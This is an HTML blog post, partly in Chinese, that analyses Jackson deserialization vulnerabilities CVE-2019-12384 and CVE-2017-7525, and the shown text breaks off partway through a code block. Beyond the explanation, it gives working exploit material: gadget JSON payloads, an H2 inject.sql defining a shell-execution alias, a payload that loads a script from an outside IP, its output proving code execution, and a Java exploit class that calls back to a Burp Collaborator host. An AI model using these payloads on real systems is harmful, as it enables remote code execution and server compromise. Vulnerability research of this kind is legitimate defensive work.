<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="pv-proxy-endpoint" content="https://myochosite-291718.appspot.com/query?id=ahNwfm15b2Nob3NpdGUtMjkxNzE4chULEghBcGlRdWVyeRiAgIDo14eBCgw"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Vul - CVE Jackson反序列化漏洞分析" /><meta property="og:locale" content="en" /><meta name="description" content="[toc]" /><meta property="og:description" content="[toc]" /><link rel="canonical" href="https://ocholuo.github.io//posts/CVE-Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" /><meta property="og:url" content="https://ocholuo.github.io//posts/CVE-Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" /><meta property="og:site_name" content="Grace" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-10-10T11:11:11-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Vul - CVE Jackson反序列化漏洞分析" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-30T21:02:21-04:00","datePublished":"2020-10-10T11:11:11-04:00","description":"[toc]","headline":"Vul - CVE Jackson反序列化漏洞分析","mainEntityOfPage":{"@type":"WebPage","@id":"https://ocholuo.github.io//posts/CVE-Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},"url":"https://ocholuo.github.io//posts/CVE-Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}</script><title>Vul - CVE Jackson反序列化漏洞分析 | Grace</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Grace"><meta name="application-name" content="Grace"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://myochosite-291718.appspot.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://myochosite-291718.appspot.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/huoye.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Grace</a></div><div class="site-subtitle font-italic">2023 Mar 14 updated</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/ocholuo" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Vul - CVE Jackson反序列化漏洞分析</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Vul - CVE Jackson反序列化漏洞分析</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Grace JyL </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Oct 10, 2020, 11:11 AM -0400" >Oct 10, 2020<i class="unloaded">2020-10-10T11:11:11-04:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Oct 30, 2022, 6:02 PM -0700" >Oct 30, 2022<i class="unloaded">2022-10-30T21:02:21-04:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1893 words">10 min read</span> <span id="pv" class="pageviews"> <i class="fas fa-spinner fa-spin fa-fw"></i> </span> views</div></div><div class="post-content"><p>[toc]</p><hr /><h1 id="jackson反序列化漏洞分析">Jackson反序列化漏洞分析</h1><p>anatomy of a vulnerability class</p><hr /><h2 id="0x00-前言">0x00 前言</h2><p>analyzed an application which used the <code class="language-plaintext highlighter-rouge">Jackson library</code> for deserializing JSONs. 反序列化JSON数据。</p><blockquote><p>JSON is a format that encodes objects in a string.</p><ul><li>Serialization: convert an object into string<ul><li>the process of translating data structures or object state into a format that can be stored (for example, in a file or memory buffer) or transmitted (for example, across a network connection link) and reconstructed later. […]</ul><li>deserialization: convert string -&gt; object</ul></blockquote><ul><li>an object: <code class="language-plaintext highlighter-rouge">{foo: [1, 4, 7, 10], bar: "baz"}</code><li>serializing: convert it into a string: <code class="language-plaintext highlighter-rouge">'{"foo":[1,4,7,10],"bar":"baz"}'</code><li>deserialize <code class="language-plaintext highlighter-rouge">{foo: [1, 4, 7, 10], bar: "baz"}</code></ul><p>In Python “<code class="language-plaintext highlighter-rouge">serialization</code>” does nothing else than just converting the given data structure (e.g. a dict) into its valid <code class="language-plaintext highlighter-rouge">JSON pendant</code> (object).</p><ul><li>Python’s True will be converted to JSONs true and the dictionary itself will then be encapsulated in quotes.<li>the difference between a Python dictionary and JSON by their Boolean values:<ul><li>Python: True / False,<li>JSON: true / false</ul><li>Python builtin module <code class="language-plaintext highlighter-rouge">json</code> is the standard way to do serialization:</ul><div class="language-py highlighter-rouge"><div class="code-header" text-data="py"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"president"</span><span class="p">:</span> <span class="p">{</span>
        <span class="s">"name"</span><span class="p">:</span> <span class="s">"Zaphod Beeblebrox"</span><span class="p">,</span>
        <span class="s">"species"</span><span class="p">:</span> <span class="s">"Betelgeusian"</span><span class="p">,</span>
        <span class="s">"male"</span><span class="p">:</span> <span class="bp">True</span><span class="p">,</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kn">import</span> <span class="n">json</span>
<span class="n">jdata</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># serialize
</span><span class="n">restored_data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">jdata</span><span class="p">)</span> <span class="c1"># deserialize
</span>
<span class="c1"># serialized jdata now looks like:
# {
#   "president": {
#     "name": "Zaphod Beeblebrox",
#     "species": "Betelgeusian",
#     "male": true
#   }
# }
</span></pre></table></code></div></div><p>In that context, identified a deserialization vulnerability where could control the class to be deserialized.</p><ul><li>利用这个反序列化漏洞发起SSRF（Server-Side Request Forgery服务端请求伪造）以及RCE（remote code execution远程代码执行）之类的攻击。</ul><p>漏洞对应的编号为CVE-2019-12384，RedHat的多个分支受该漏洞影响:</p><p><img data-proofer-ignore data-src="https://i.imgur.com/7sMLFoY.png" alt="jackson-impact" /></p><hr /><h1 id="cve-2019-12384jackson反序列化漏洞分析">CVE-2019-12384：Jackson反序列化漏洞分析</h1><h2 id="0x01-利用条件">0x01 利用条件</h2><p>触发这个Jackson漏洞需要满足如下要求：</p><ol><li>The application accepts JSON content sent by an untrusted client<ol><li>composed either manually or by a code you did not write and have no visibility or control over<li>can not constrain JSON itself that is being sent, 无法约束正在发送的JSON数据；</ol><li>The application uses <code class="language-plaintext highlighter-rouge">polymorphic type handling</code> for properties with nominal type of<ol><li><code class="language-plaintext highlighter-rouge">java.lang.Object</code><li>one of small number of “permissive” tag interfaces such as <code class="language-plaintext highlighter-rouge">java.util.Serializable</code>, <code class="language-plaintext highlighter-rouge">java.util.Comparable</code></ol><li>The application has at least one specific <code class="language-plaintext highlighter-rouge">“gadget” class</code> to exploit in the <code class="language-plaintext highlighter-rouge">Java classpath</code>.<ol><li>exploitation requires a class that works with Jackson.<li>In fact, most gadgets only work with specific libraries — e.g. most commonly reported ones work with JDK serialization</ol><li>The application uses a version of Jackson that does not (yet) block the specific “gadget” class.<ol><li>There is a set of published gadgets which grows over time so it is a race between people finding and reporting gadgets and the patches.<li>Jackson operates on a blacklist.<li>The deserialization is a “feature” of the platform and they continually update a blacklist of known gadgets that people report.</ol></ol><p>假设利用场景已满足条件1及条件2。</p><p>实际上，我们重点寻找的是能够满足条件3及条件4的<code class="language-plaintext highlighter-rouge">gadget</code>。</p><blockquote><p>Jackson is one of the most used deserialization frameworks for Java applications where polymorphism is a first-class concept.</p><p>Finding these conditions comes at zero-cost if use static analysis tools or dynamic techniques(such as <code class="language-plaintext highlighter-rouge">grep @class in request/responses</code>) to find these targets.</p></blockquote><hr /><h2 id="0x02-环境准备">0x02 环境准备</h2><p>在研究过程中，我们开发了一款工具来帮助分析这类漏洞。</p><p>当<code class="language-plaintext highlighter-rouge">Jackson</code>反序列化<code class="language-plaintext highlighter-rouge">ch.qos.logback.core.db.DriverManagerConnectionSource</code>时</p><ul><li>可滥用<code class="language-plaintext highlighter-rouge">ch.qos.logback.core.db.DriverManagerConnectionSource</code>类来实例JDBC connection<ul><li>Java Database Connectivity</ul><li>JDBC is a Java API to connect and execute a query with the database<li>it is a part of JavaSE (Standard Edition)<li>Moreover, JDBC uses an <code class="language-plaintext highlighter-rouge">automatic string to class mapping</code>, so it is a perfect target to load and execute even more “gadgets” inside the chain.</ul><p>prepared a <strong>wrapper</strong> to load <code class="language-plaintext highlighter-rouge">arbitrary polymorphic classes</code> specified by an attacker.</p><ul><li>used jRuby, a ruby implementation running on top of the <code class="language-plaintext highlighter-rouge">Java Virtual Machine (JVM)</code>.<li>load and instantiate Java classes.</ul><p>use this setup to load Java classes easily in a given directory and prepare the Jackson environment to meet the first two requirements (1,2) listed above</p><div class="language-ruby highlighter-rouge"><div class="code-header" text-data="ruby"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="c1"># loads all of the classes contained Java Archives(JAR) in the “classpath” subdirectory</span>
<span class="nb">require</span> <span class="s1">'java'</span>
<span class="no">Dir</span><span class="p">[</span><span class="s2">"./classpath/*.jar"</span><span class="p">].</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">f</span><span class="o">|</span>
    <span class="nb">require</span> <span class="n">f</span>
<span class="k">end</span>

<span class="c1"># configures Jackson in order to meet requirements</span>
<span class="n">java_import</span> <span class="s1">'com.fasterxml.jackson.databind.ObjectMapper'</span>
<span class="n">java_import</span> <span class="s1">'com.fasterxml.jackson.databind.SerializationFeature'</span>

<span class="n">content</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

<span class="nb">puts</span> <span class="s2">"Mapping"</span>
<span class="n">mapper</span> <span class="o">=</span> <span class="no">ObjectMapper</span><span class="p">.</span><span class="nf">new</span>
<span class="n">mapper</span><span class="p">.</span><span class="nf">enableDefaultTyping</span><span class="p">()</span>
<span class="n">mapper</span><span class="p">.</span><span class="nf">configure</span><span class="p">(</span><span class="no">SerializationFeature</span><span class="o">::</span><span class="no">FAIL_ON_EMPTY_BEANS</span><span class="p">,</span> <span class="kp">false</span><span class="p">);</span>

<span class="c1"># deserializes and serializes a polymorphic Jackson object passed to jRuby as JSON</span>
<span class="nb">puts</span> <span class="s2">"Serializing"</span>
<span class="c1"># Jackson will recursively call all of the setters with the key contained inside the subobject.</span>
<span class="c1"># the setUrl(String url) is called with arguments by the Jackson reflection library.</span>
<span class="n">obj</span> <span class="o">=</span> <span class="n">mapper</span><span class="p">.</span><span class="nf">readValue</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">java</span><span class="p">.</span><span class="nf">lang</span><span class="o">.</span><span class="no">Object</span><span class="p">.</span><span class="nf">java_class</span><span class="p">)</span> <span class="c1"># invokes all the setters</span>
<span class="nb">puts</span> <span class="s2">"objectified"</span>
<span class="c1"># the full object is serialized into a JSON object again.</span>
<span class="nb">puts</span> <span class="s2">"stringified: "</span> <span class="o">+</span> <span class="n">mapper</span><span class="p">.</span><span class="nf">writeValueAsString</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
</pre></table></code></div></div><hr /><h2 id="0x03-gadget">0x03 Gadget</h2><blockquote><p>SSRF攻击中并不需要使用h2库，因为大多数Java应用至少会加载一个JDBC驱动。 JDBC Drivers are classes that, when a JDBC url is passed in, are automatically instantiated and the full URL is passed to them as an argument.</p></blockquote><p>call the previous script with the aforementioned classpath.</p><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>jruby test.rb <span class="s2">"["</span>ch.qos.logback.core.db.DriverManagerConnectionSource<span class="s2">", {"</span>url<span class="s2">":"</span>jdbc:h2:mem:<span class="s2">"}]"</span>
</pre></table></code></div></div><ol><li>Jackson will recursively 递归地 call all of the setters with the key contained inside the subobject. the <code class="language-plaintext highlighter-rouge">setUrl(String url)</code> is called with arguments by the <strong>Jackson reflection library</strong>.<li>the full object is serialized into a JSON object again.<li>At this point all the fields are serialized directly, if no getter is defined, or through an explicit getter.<li>When the <code class="language-plaintext highlighter-rouge">getConnection</code> is called, an <code class="language-plaintext highlighter-rouge">in memory database</code> is instantiated.<ol><li>Since the application is short lived, won’t see any meaningful effect from the attacker’s perspective.<li>to do something meaningful, create a connection to a remote database.<li>If the target application is deployed as a remote service, an attacker can generate a Server Side Request Forgery (SSRF).</ol></ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>jruby test.rb <span class="s2">"["</span>ch.qos.logback.core.db.DriverManagerConnectionSource <span class="nv">$ </span>nc <span class="nt">-lv</span> 8080 rce<span class="s2">", {"</span>url<span class="s2">":"</span>jdbc:h2:tcp://localhost:8080/~/test<span class="s2">"}]"</span>  ~/test#jdbc:h2:tcp://localhost:8080/~/test_
<span class="c"># Mapping</span>
<span class="c"># Serializing</span>
<span class="c"># objectified</span>
</pre></table></code></div></div><hr /><h2 id="0x04-从ssrf到rce">0x04 从SSRF到RCE</h2><p>这些攻击场景都与DoS以及SSRF有关,可能影响应用的安全性</p><p>将SSRF转换成完成的RCE攻击链。</p><ul><li>to gain full code execution in the context of the application<li>employed the capability of <code class="language-plaintext highlighter-rouge">loading the H2 JDBC Driver</code><ul><li>H2<ul><li>a super fast SQL database<li>usually employed as <strong>in memory replacement</strong> for full-fledged SQL Database Management Systems<ul><li>such as Postgresql, MSSql, MySql or OracleDB</ul><li>easily configurable and supports many modes<ul><li>such as in memory, on file, and on remote servers.</ul><li><strong>can run SQL scripts from the JDBC URL</strong><ul><li>which for have an in-memory database to support <code class="language-plaintext highlighter-rouge">init migrations</code>.</ul></ul></ul></ul><blockquote><p>This alone won’t allow execute Java code inside the JVM context. but H2 was implemented inside the JVM, has the capability to <code class="language-plaintext highlighter-rouge">specify custom aliases containing java code</code>.</p><ul><li><strong>which can abuse to execute arbitrary code</strong>.</ul></blockquote><p>通过python构建一个简单的HTTP服务器</p><ul><li><code class="language-plaintext highlighter-rouge">python -m SimpleHttpServer</code><li>托管如下inject.sql INIT文件：</ul><div class="language-sql highlighter-rouge"><div class="code-header" text-data="sql"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="k">CREATE</span> <span class="k">ALIAS</span> <span class="n">SHELLEXEC</span> <span class="k">AS</span> <span class="err">$$</span> <span class="n">String</span> <span class="n">shellexec</span><span class="p">(</span><span class="n">String</span> <span class="n">cmd</span><span class="p">)</span> <span class="n">throws</span> <span class="n">java</span><span class="p">.</span><span class="n">io</span><span class="p">.</span><span class="n">IOException</span> <span class="p">{</span>
    <span class="n">String</span><span class="p">[]</span> <span class="n">command</span> <span class="o">=</span> <span class="p">{</span><span class="nv">"bash"</span><span class="p">,</span> <span class="nv">"-c"</span><span class="p">,</span> <span class="n">cmd</span><span class="p">};</span>
    <span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">Scanner</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="n">getRuntime</span><span class="p">().</span><span class="k">exec</span><span class="p">(</span><span class="n">command</span><span class="p">).</span><span class="n">getInputStream</span><span class="p">()).</span><span class="n">useDelimiter</span><span class="p">(</span><span class="nv">"</span><span class="se">\A</span><span class="nv">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">s</span><span class="p">.</span><span class="n">hasNext</span><span class="p">()</span> <span class="o">?</span> <span class="n">s</span><span class="p">.</span><span class="k">next</span><span class="p">()</span> <span class="p">:</span> <span class="nv">""</span><span class="p">;</span>  <span class="p">}</span>
<span class="err">$$</span><span class="p">;</span>
<span class="k">CALL</span> <span class="n">SHELLEXEC</span><span class="p">(</span><span class="s1">'id &gt; exploited.txt'</span><span class="p">)</span>
</pre></table></code></div></div><p>然后通过如下方式运行RCE：</p><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>jruby test.rb <span class="s2">"["</span>ch.qos.logback.core.db.DriverManagerConnectionSource<span class="s2">", {"</span>url<span class="s2">":"</span>jdbc:h2:mem:<span class="p">;</span><span class="nv">TRACE_LEVEL_SYSTEM_OUT</span><span class="o">=</span>3<span class="p">;</span><span class="nv">INIT</span><span class="o">=</span>RUNSCRIPT FROM <span class="s1">'http://localhost:8000/inject.sql'</span><span class="s2">"}]"</span>

<span class="nv">$ </span><span class="nb">cat </span>exploited.txt
<span class="nv">uid</span><span class="o">=</span>501<span class="o">(</span>...<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>20<span class="o">(</span>staff<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>20<span class="o">(</span>staff<span class="o">)</span>,12<span class="o">(</span>everyone<span class="o">)</span>,61<span class="o">(</span>localaccounts<span class="o">)</span>,79<span class="o">(</span>_appserverusr<span class="o">)</span>,80<span class="o">(</span>admin<span class="o">)</span>,81<span class="o">(</span>_appserveradm<span class="o">)</span>,98<span class="o">(</span>_lpadmin<span class="o">)</span>,501<span class="o">(</span>access_bpf<span class="o">)</span>,701<span class="o">(</span>com.apple.sharepoint.group.1<span class="o">)</span>,33<span class="o">(</span>_appstore<span class="o">)</span>,100<span class="o">(</span>_lpoperator<span class="o">)</span>,204<span class="o">(</span>_developer<span class="o">)</span>,250<span class="o">(</span>_analyticsusers<span class="o">)</span>,395<span class="o">(</span>com.apple.access_ftp<span class="o">)</span>,398<span class="o">(</span>com.apple.access_screensharing<span class="o">)</span>,399<span class="o">(</span>com.apple.access_ssh<span class="o">)</span>
</pre></table></code></div></div><hr /><h1 id="cve-2017-7525---jackson-rce">CVE-2017-7525 - Jackson RCE</h1><div class="language-java highlighter-rouge"><div class="code-header" text-data="java"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre>
<span class="c1">// JSON -&gt; java object</span>

<span class="c1">// There are a couple of ways to use Jackson</span>
<span class="c1">// perform a binding to a single object,</span>
<span class="c1">// pulling the values from the JSON</span>
<span class="c1">// and setting the properties on the associated Java object.</span>
<span class="c1">// This is simple, straightforward, and likely not exploitable.</span>
<span class="o">{</span>
  <span class="s">"name"</span> <span class="o">:</span> <span class="s">"Bob"</span><span class="o">,</span> <span class="s">"age"</span> <span class="o">:</span> <span class="mi">13</span><span class="o">,</span>
  <span class="s">"other"</span> <span class="o">:</span> <span class="o">{</span>
     <span class="s">"type"</span> <span class="o">:</span> <span class="s">"student"</span>
  <span class="o">}</span>
<span class="o">}</span>


<span class="c1">// you are create arbitrary objects, and you will see their class name in the JSON document.</span>
<span class="c1">// If you see this, it should raise an immediate red flag.</span>
<span class="c1">// Here’s a sample of what these look like:</span>
<span class="o">{</span>
  <span class="s">"@class"</span><span class="o">:</span><span class="s">"MyApp.Obj"</span><span class="o">,</span>
  <span class="nl">val:</span><span class="o">[</span>
    <span class="s">"java.lang.Long"</span><span class="o">,</span>
    <span class="mi">1</span>
  <span class="o">]</span>
<span class="o">}</span>

</pre></table></code></div></div><p>To determine if this really is Jackson that you are seeing, one technique is (if detailed error messages are available) to provide invalid input and look for references to either of these:</p><ul><li><code class="language-plaintext highlighter-rouge">com.fasterxml.jackson.databind</code><li><code class="language-plaintext highlighter-rouge">org.codehaus.jackson.map</code></ul><hr /><h2 id="building-an-exploit">Building An Exploit</h2><div class="language-java highlighter-rouge"><div class="code-header" text-data="java"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="c1">// Helpfully, the project gave us a starting point to build an effective exploit in one of their unit tests:</span>

<span class="o">{</span><span class="err">'</span><span class="n">id</span><span class="err">'</span><span class="o">:</span> <span class="mi">124</span><span class="o">,</span>
 <span class="err">'</span><span class="n">obj</span><span class="err">'</span><span class="o">:[</span> <span class="err">'</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xalan</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">xsltc</span><span class="o">.</span><span class="na">trax</span><span class="o">.</span><span class="na">TemplatesImpl</span><span class="err">'</span><span class="o">,</span>
  <span class="o">{</span>
    <span class="err">'</span><span class="n">transletBytecodes</span><span class="err">'</span> <span class="o">:</span> <span class="o">[</span> <span class="err">'</span><span class="no">AAIAZQ</span><span class="o">==</span><span class="err">'</span> <span class="o">],</span>
    <span class="err">'</span><span class="n">transletName</span><span class="err">'</span> <span class="o">:</span> <span class="err">'</span><span class="n">a</span><span class="o">.</span><span class="na">b</span><span class="err">'</span><span class="o">,</span>
    <span class="err">'</span><span class="n">outputProperties</span><span class="err">'</span> <span class="o">:</span> <span class="o">{</span> <span class="o">}</span>
  <span class="o">}]</span>
<span class="o">}</span>
<span class="c1">// This code leverages a well-known ‘gadget’ to create an object that will accept a compile Java object (via transletBytecodes)</span>
<span class="c1">// and execute it as soon as outputProperties is accessed.</span>
<span class="c1">// This creates a very simple, straightforward technique to exploit this vulnerability.</span>


<span class="o">[</span><span class="s">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span><span class="o">,</span> <span class="o">{</span><span class="s">"url"</span><span class="o">:</span><span class="s">"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.50:9000/inject.sql'"</span><span class="o">}]</span>

</pre></table></code></div></div><hr /><h2 id="building-the-payload">Building The Payload</h2><p>to prove that we have execution, and the route I went is to have the server issue a GET request to Burp Collaborator. This can be done easily with the following sample code:</p><div class="language-java highlighter-rouge"><div class="code-header" text-data="java"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.net.*</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Exploit</span> <span class="kd">extends</span> <span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xalan</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">xsltc</span><span class="o">.</span><span class="na">runtime</span><span class="o">.</span><span class="na">AbstractTranslet</span> <span class="o">{</span>
  <span class="kd">public</span> <span class="nf">Exploit</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
    <span class="nc">StringBuilder</span> <span class="n">result</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
    <span class="no">URL</span> <span class="n">url</span> <span class="o">=</span> <span class="k">new</span> <span class="no">URL</span><span class="o">(</span><span class="s">"http://[your-url].burpcollaborator.net"</span><span class="o">);</span>
    <span class="nc">HttpURLConnection</span> <span class="n">conn</span> <span class="o">=</span> <span class="o">(</span><span class="nc">HttpURLConnection</span><span class="o">)</span> <span class="n">url</span><span class="o">.</span><span class="na">openConnection</span><span class="o">();</span>
    <span class="n">conn</span><span class="o">.</span><span class="na">setRequestMethod</span><span class="o">(</span><span class="s">"GET"</span><span class="o">);</span>
    <span class="nc">BufferedReader</span> <span class="n">rd</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nc">InputStreamReader</span><span class="o">(</span><span class="n">conn</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
    <span class="nc">String</span> <span class="n">line</span><span class="o">;</span>
